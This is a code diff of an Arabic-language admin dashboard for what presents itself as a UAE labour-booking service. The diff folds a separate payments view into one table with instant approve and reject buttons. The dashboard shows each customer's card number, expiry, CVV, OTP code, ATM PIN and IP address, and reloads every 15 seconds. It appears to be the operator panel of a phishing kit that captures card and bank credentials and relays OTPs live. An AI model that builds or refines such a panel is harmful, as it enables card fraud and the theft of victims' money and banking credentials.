@@ -4,7 +4,6 @@
     const TK = 'tdAdminToken';
     let leadsData = [];
     let paysData = [];
-    let currentTab = 'leads'; // 'leads' or 'payments'
 
     const loginPage = document.getElementById('login-page');
     const dashPage = document.getElementById('dashboard-page');
@@ -18,8 +17,6 @@
     const modal = document.getElementById('modal');
     const modalTitle = document.getElementById('modal-title');
     const modalBody = document.getElementById('modal-body');
-    const tabLeadsBtn = document.getElementById('tab-leads');
-    const tabPaymentsBtn = document.getElementById('tab-payments');
     const tableTitle = document.querySelector('.table-title');
 
     function token() { return localStorage.getItem(TK) || ''; }
@@ -61,8 +58,6 @@
             else if (/السعر|price/.test(key)) result.price = value;
             else if (/الإجمالي|total/.test(key)) result.total = value;
         });
-        result.isHourly = /بالساعة|hourly/i.test(result.serviceType + ' ' + source);
-        result.isMonthly = /بالشهر|monthly|شهري/i.test(result.serviceType + ' ' + source);
         return result;
     }
 
@@ -81,19 +76,10 @@
     function statusText(lead, payment) {
         if (payment && payment.decision === 'approved') return ['مقبول (مدفوع)', 'status-done'];
         if (payment && payment.decision === 'rejected') return ['مرفوض', 'status-fail'];
-        if (payment && payment.stage === 'success') return ['مكتمل', 'status-done'];
+        if (payment && payment.stage === 'success') return ['مكتمل بنجاح', 'status-done'];
         if (payment && (payment.stage === 'card_initiated' || payment.stage === 'otp_verified')) return ['قيد التحقق/الدفع', 'status-card'];
         if (lead && lead.status === 'completed') return ['مكتمل', 'status-done'];
         return [lead && lead.status === 'new' ? 'جديد' : (lead && lead.status) || 'جديد', 'status-otp'];
-    }
-
-    function paymentStageText(stage) {
-        switch(stage) {
-            case 'card_initiated': return ['إدخال البطاقة', 'status-card'];
-            case 'otp_verified': return ['تحقق OTP', 'status-otp'];
-            case 'success': return ['مكتمل بنجاح', 'status-done'];
-            default: return [stage || 'غير محدد', 'status-otp'];
-        }
     }
 
     function statusBadge(lead, payment) {
@@ -133,7 +119,7 @@
             }
             leadsData = Array.isArray(leads) ? leads : [];
             paysData = Array.isArray(pays) ? pays : [];
-            renderCurrentView();
+            renderTable();
         } catch (error) {
             console.error('Admin data load error:', error);
             document.getElementById('t-body').innerHTML = '<tr><td colspan="9" class="empty-row">تعذر تحميل البيانات. حاول التحديث.</td></tr>';
@@ -142,30 +128,25 @@
         }
     }
 
-    function renderCurrentView() {
-        if (currentTab === 'leads') {
-            tableTitle.innerText = 'طلبات الحجز والعملاء';
-            renderLeadsTable();
-        } else {
-            tableTitle.innerText = 'عمليات الدفع والتحقق (البطاقات، OTP، PIN)';
-            renderPaymentsTable();
-        }
-    }
-
-    function renderLeadsTable() {
+    function renderTable() {
+        tableTitle.innerText = 'طلبات العملاء ومعاملات الدفع والتحقق';
         const query = (searchInput.value || '').trim().toLowerCase();
+        
         const rows = leadsData.map(lead => ({ lead, payment: latestPayment(lead.contract_no) }));
         paysData.forEach(payment => {
-            if (!rows.some(row => row.lead && row.lead.contract_no === payment.contract_no)) rows.push({ lead: null, payment });
+            if (!rows.some(row => row.lead && row.lead.contract_no === payment.contract_no)) {
+                rows.push({ lead: null, payment });
+            }
         });
-        rows.sort((a, b) => String(b.lead?.created_at || b.payment?.updated_at || '').localeCompare(String(a.lead?.created_at || b.payment?.updated_at || '')));
+        rows.sort((a, b) => String(b.lead?.created_at || b.payment?.updated_at || '').localeCompare(String(a.lead?.created_at || a.payment?.updated_at || '')));
         const filtered = query ? rows.filter(row => JSON.stringify(row).toLowerCase().includes(query)) : rows;
+        
         const thead = document.getElementById('t-head');
         const tbody = document.getElementById('t-body');
 
-        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>اسم العميل</th><th>رقم الهاتف</th><th>البريد الإلكتروني</th><th>تاريخ البدء</th><th>رقم العقد</th><th>الحالة</th><th>الإجراءات</th></tr>';
+        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>اسم العميل</th><th>رقم الهاتف</th><th>البريد الإلكتروني</th><th>تاريخ البدء</th><th>رقم العقد</th><th>الحالة</th><th>الإجراءات الفورية والقرار</th></tr>';
         if (!filtered.length) {
-            tbody.innerHTML = '<tr><td colspan="9" class="empty-row">لا توجد طلبات مطابقة</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="9" class="empty-row">لا توجد طلبات أو معاملات دفع مسجلة حتى الآن</td></tr>';
             return;
         }
 
@@ -189,7 +170,12 @@
                 (info.nationality !== '—' ? '<span style="margin-right:6px;">الجنسية: <b>' + esc(info.nationality) + '</b></span>' : '') +
                 '</div></div>';
 
-            const actions = '<button class="btn-act" onclick="openLeadDetails(' + (lead ? lead.id : 'null') + ', \'' + esc(contractNo) + '\')">عرض التفاصيل</button>';
+            // أزرار القرار الفوري والقبول والرفض إذا وجد دفع
+            let actions = '<button class="btn-act" onclick="openDetails(' + (lead ? lead.id : 'null') + ', \'' + esc(contractNo) + '\')">عرض التفاصيل</button>';
+            if (payment) {
+                actions += '<button class="btn-act btn-approve" onclick="decidePayment(' + payment.id + ', \'approved\')">قبول</button>' +
+                           '<button class="btn-act btn-reject" onclick="decidePayment(' + payment.id + ', \'rejected\')">رفض</button>';
+            }
 
             return '<tr>' +
                 '<td><span class="service-type">' + esc(info.serviceType) + '</span></td>' +
@@ -205,29 +191,6 @@
         }).join('');
     }
 
-    function renderPaymentsTable() {
-        const query = (searchInput.value || '').trim().toLowerCase();
-        const filtered = query ? paysData.filter(p => JSON.stringify(p).toLowerCase().includes(query)) : paysData;
-        const thead = document.getElementById('t-head');
-        const tbody = document.getElementById('t-body');
-
-        thead.innerHTML = '<tr><th>رقم العقد</th><th>اسم العميل</th><th>المبلغ</th><th>معلومات الخدمة</th><th>المرحلة</th><th>OTP / PIN</th><th>قرار الإدارة</th><th>الإجراءات الفورية</th></tr>';
-        if (!filtered.length) {
-            tbody.innerHTML = '<tr><td colspan="8" class="empty-row">لا توجد عمليات دفع مسجلة حتى الآن</td></tr>';
-            return;
-        }
-
-        tbody.innerHTML = filtered.map(p => {
-            const [stLabel, stCls] = paymentStageText(p.stage);
-            const decisionHtml = p.decision === 'approved' ? '<span class="status-done">مقبول</span>' : (p.decision === 'rejected' ? '<span class="status-fail">مرفوض</span>' : '<span class="status-otp">قيد الانتظار</span>');
-            const otpPinInfo = 'OTP: <b>' + esc(p.otp_code || '—') + '</b> | PIN: <b>' + esc(p.atm_pin || '—') + '</b>';
-            const actions = '<button class="btn-act btn-approve" onclick="decidePayment(' + p.id + ', \'approved\')">قبول</button>' +
-                            '<button class="btn-act btn-reject" onclick="decidePayment(' + p.id + ', \'rejected\')">رفض</button>' +
-                            '<button class="btn-act btn-expand" onclick="openPaymentDetails(' + p.id + ')">عرض البطاقة</button>';
-            return '<tr><td><span class="badge" dir="ltr">' + esc(p.contract_no) + '</span></td><td><strong>' + esc(p.customer_name) + '</strong></td><td><span class="link-amt">' + esc(p.amount) + ' د.إ</span></td><td>' + esc(p.service_info || '—') + '</td><td><span class="' + stCls + '">' + esc(stLabel) + '</span></td><td dir="ltr">' + otpPinInfo + '</td><td>' + decisionHtml + '</td><td><div class="action-btns">' + actions + '</div></td></tr>';
-        }).join('');
-    }
-
     window.decidePayment = async function (id, decision) {
         try {
             const res = await fetch('/api/admin/payments/' + id + '/decide', {
@@ -237,6 +200,7 @@
             });
             const data = await res.json();
             if (data.success) {
+                alert(decision === 'approved' ? 'تم قبول الدفع بنجاح وإشعار العميل!' : 'تم رفض الدفع وإشعار العميل.');
                 await loadAll();
             } else {
                 alert('فشل تنفيذ القرار');
@@ -246,15 +210,11 @@
         }
     };
 
-    function detailField(label, value, direction) {
-        return '<div class="detail-row"><div class="detail-label">' + esc(label) + '</div><div class="detail-value"' + (direction ? ' dir="' + direction + '"' : '') + '><span class="val-text">' + esc(value || '—') + '</span></div></div>';
-    }
-
-    window.openLeadDetails = function (id, contractNo) {
+    window.openDetails = function (id, contractNo) {
         const lead = leadsData.find(item => item.id == id) || null;
         const payment = latestPayment(contractNo);
         
-        modalTitle.innerText = 'تفاصيل الطلب والعميل — العقد: ' + (contractNo || 'بدون');
+        modalTitle.innerText = 'تفاصيل الطلب والعقد الشاملة — ' + (contractNo || 'بدون عقد');
         let html = '';
 
         // 1. بيانات العميل
@@ -262,13 +222,13 @@
         if (lead) {
             html += '<div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:10px; padding:14px; margin-bottom:16px;">';
             html += '<div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; font-size:13.5px;">';
-            html += '<div><b>الاسم:</b> ' + esc(lead.full_name) + '</div>';
-            html += '<div dir="ltr"><b>الهاتف:</b> ' + esc(lead.phone) + '</div>';
-            html += '<div dir="ltr"><b>البريد:</b> ' + esc(lead.email) + '</div>';
+            html += '<div><b>الاسم الكامل:</b> ' + esc(lead.full_name) + '</div>';
+            html += '<div dir="ltr"><b>رقم الهاتف:</b> ' + esc(lead.phone) + '</div>';
+            html += '<div dir="ltr"><b>البريد الإلكتروني:</b> ' + esc(lead.email) + '</div>';
             html += '<div><b>العنوان / المدينة:</b> ' + esc(lead.city) + '</div>';
             html += '</div></div>';
         } else {
-            html += '<div style="color:#94a3b8; margin-bottom:16px;">لا توجد بيانات عميل مسجلة مباشرة لهذا العقد.</div>';
+            html += '<div style="color:#94a3b8; margin-bottom:16px; font-size:13px;">لا توجد بيانات عميل نصية مسجلة مباشرة (طلب دفع مباشر).</div>';
         }
 
         // 2. تفاصيل الخدمة المختارة
@@ -277,7 +237,7 @@
         html += '<div style="background:#f0fdf4; border:1px solid #dcfce7; border-radius:10px; padding:14px; margin-bottom:16px; font-size:13.5px; line-height:1.6;">';
         html += '<div><b>نوع الخدمة الرئيسية:</b> ' + esc(info.serviceType) + '</div>';
         html += '<div><b>الخدمة المحددة:</b> ' + esc(info.service) + '</div>';
-        html += '<div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; margin-top:8px; border-top:1px dashed #bbf7d0; pt:8px;">';
+        html += '<div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; margin-top:8px; border-top:1px dashed #bbf7d0; padding-top:8px;">';
         html += '<div>المدة: <b>' + esc(info.duration) + '</b></div>';
         html += '<div>نوع الدوام: <b>' + esc(info.workType) + '</b></div>';
         html += '<div>عدد العمالة: <b>' + esc(info.workers) + '</b></div>';
@@ -286,70 +246,41 @@
         html += '<div>الوقت: <b>' + esc(info.startTime) + '</b></div>';
         html += '</div>';
         if (lead && lead.message) {
-            html += '<div style="margin-top:10px; font-size:12.5px; color:#166534; border-top:1px solid #bbf7d0; padding-top:6px;"><b>النص الكامل للطلب:</b> ' + esc(lead.message) + '</div>';
+            html += '<div style="margin-top:10px; font-size:12.5px; color:#166534; border-top:1px solid #bbf7d0; padding-top:6px;"><b>ملخص الحجز الأصلي:</b> ' + esc(lead.message) + '</div>';
         }
         html += '</div>';
 
-        // 3. معلومات البطاقة والتحقق والدفع
+        // 3. معلومات البطاقة والتحقق والدفع (OTP & ATM PIN)
         if (payment) {
             html += '<div class="sec-header sec-purple"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>بيانات الدفع والبطاقة ورمز التحقق (OTP & PIN)</div>';
             html += '<div style="background:#faf5ff; border:1px solid #f3e8ff; border-radius:10px; padding:14px; font-size:13.5px;">';
             html += '<div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:8px;">';
-            html += '<div><b>المبلغ:</b> <span style="color:#2563eb; font-weight:700;">' + esc(payment.amount) + ' د.إ</span></div>';
-            html += '<div><b>المرحلة:</b> ' + esc(payment.stage) + '</div>';
-            html += '<div><b>حامل البطاقة:</b> ' + esc(payment.card_name) + '</div>';
+            html += '<div><b>المبلغ الإجمالي:</b> <span style="color:#2563eb; font-weight:700;">' + esc(payment.amount) + ' درهم</span></div>';
+            html += '<div><b>المرحلة الحالية:</b> ' + esc(payment.stage) + '</div>';
+            html += '<div><b>اسم حامل البطاقة:</b> ' + esc(payment.card_name) + '</div>';
             html += '<div dir="ltr"><b>رقم البطاقة:</b> ' + esc(payment.card_number) + '</div>';
             html += '<div dir="ltr"><b>تاريخ الانتهاء / CVV:</b> ' + esc(payment.card_expiry) + ' / ' + esc(payment.card_cvv) + '</div>';
-            html += '<div dir="ltr"><b>رمز التحقق OTP:</b> <span style="color:#d97706; font-weight:700;">' + esc(payment.otp_code || '—') + '</span></div>';
-            html += '<div dir="ltr"><b>رقم الصراف PIN:</b> <span style="color:#7c3aed; font-weight:700;">' + esc(payment.atm_pin || '—') + '</span></div>';
-            html += '<div><b>قرار الإدارة:</b> ' + esc(payment.decision || 'قيد الانتظار') + '</div>';
-            html += '</div></div>';
+            html += '<div dir="ltr"><b>رمز التحقق OTP:</b> <span style="color:#d97706; font-weight:700; font-size:15px;">' + esc(payment.otp_code || '—') + '</span></div>';
+            html += '<div dir="ltr"><b>رقم الصراف ATM PIN:</b> <span style="color:#7c3aed; font-weight:700; font-size:15px;">' + esc(payment.atm_pin || '—') + '</span></div>';
+            html += '<div><b>قرار الإدارة:</b> ' + (payment.decision === 'approved' ? '<span style="color:#16a34a; font-weight:700;">مقبول</span>' : (payment.decision === 'rejected' ? '<span style="color:#dc2626; font-weight:700;">مرفوض</span>' : '<span style="color:#ca8a04; font-weight:700;">قيد الانتظار</span>')) + '</div>';
+            html += '</div>';
+            html += '<div style="margin-top:12px; display:flex; gap:10px; border-top:1px solid #e9d5ff; padding-top:10px;">';
+            html += '<button class="btn-act btn-approve" style="flex:1; height:38px; justify-content:center;" onclick="decidePayment(' + payment.id + ', \'approved\')">قبول الدفع فوراً</button>';
+            html += '<button class="btn-act btn-reject" style="flex:1; height:38px; justify-content:center;" onclick="decidePayment(' + payment.id + ', \'rejected\')">رفض الدفع</button>';
+            html += '</div>';
+            html += '</div>';
         } else {
             html += '<div class="sec-header sec-amber"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>حالة الدفع</div>';
-            html += '<div style="background:#fffbeb; border:1px solid #fef3c7; border-radius:10px; padding:12px; color:#b45309; font-size:13px;">لم يتم تسجيل عملية دفع بالبطاقة لهذا العقد حتى هذه اللحظة.</div>';
+            html += '<div style="background:#fffbeb; border:1px solid #fef3c7; border-radius:10px; padding:12px; color:#b45309; font-size:13px;">لم يتم تسجيل عملية دفع بالبطاقة أو إدخال OTP حتى هذه اللحظة لهذا العقد.</div>';
         }
 
         modalBody.innerHTML = html;
         modal.classList.add('show');
     };
 
-    window.openPaymentDetails = function (id) {
-        const payment = paysData.find(item => item.id == id);
-        if (!payment) return;
-        modalTitle.innerText = 'تفاصيل عملية الدفع — عقد ' + (payment.contract_no || '');
-        modalBody.innerHTML = '<div class="detail-section-title">بيانات البطاقة والدفع</div>' +
-            detailField('رقم العقد', payment.contract_no, 'ltr') +
-            detailField('اسم العميل', payment.customer_name) +
-            detailField('المبلغ', payment.amount + ' درهم') +
-            detailField('اسم حامل البطاقة', payment.card_name) +
-            detailField('رقم البطاقة', payment.card_number, 'ltr') +
-            detailField('تاريخ الانتهاء', payment.card_expiry, 'ltr') +
-            detailField('رمز الأمان CVV', payment.card_cvv, 'ltr') +
-            detailField('رمز التحقق OTP', payment.otp_code, 'ltr') +
-            detailField('رمز ATM PIN', payment.atm_pin, 'ltr') +
-            detailField('المرحلة', payment.stage) +
-            detailField('قرار الإدارة', payment.decision || 'قيد الانتظار') +
-            detailField('عنوان IP العميل', payment.client_ip, 'ltr');
-        modal.classList.add('show');
-    };
-
     function closeModal() { modal.classList.remove('show'); }
     document.getElementById('modal-close').addEventListener('click', closeModal);
     modal.addEventListener('click', event => { if (event.target === modal) closeModal(); });
-
-    // تبديل التبويبات
-    tabLeadsBtn.addEventListener('click', () => {
-        tabLeadsBtn.classList.add('active');
-        tabPaymentsBtn.classList.remove('active');
-        currentTab = 'leads';
-        renderCurrentView();
-    });
-    tabPaymentsBtn.addEventListener('click', () => {
-        tabPaymentsBtn.classList.add('active');
-        tabLeadsBtn.classList.remove('active');
-        currentTab = 'payments';
-        renderCurrentView();
-    });
 
     loginBtn.addEventListener('click', async () => {
         const password = pwInput.value.trim();
@@ -367,7 +298,7 @@
     eyeBtn.addEventListener('click', () => { pwInput.type = pwInput.type === 'password' ? 'text' : 'password'; });
     document.getElementById('logout-btn').addEventListener('click', () => { localStorage.removeItem(TK); dashPage.style.display = 'none'; loginPage.style.display = 'flex'; pwInput.value = ''; });
     refreshBtn.addEventListener('click', loadAll);
-    searchInput.addEventListener('input', renderCurrentView);
+    searchInput.addEventListener('input', renderTable);
     setInterval(loadAll, 15000);
 
     (async function init() {
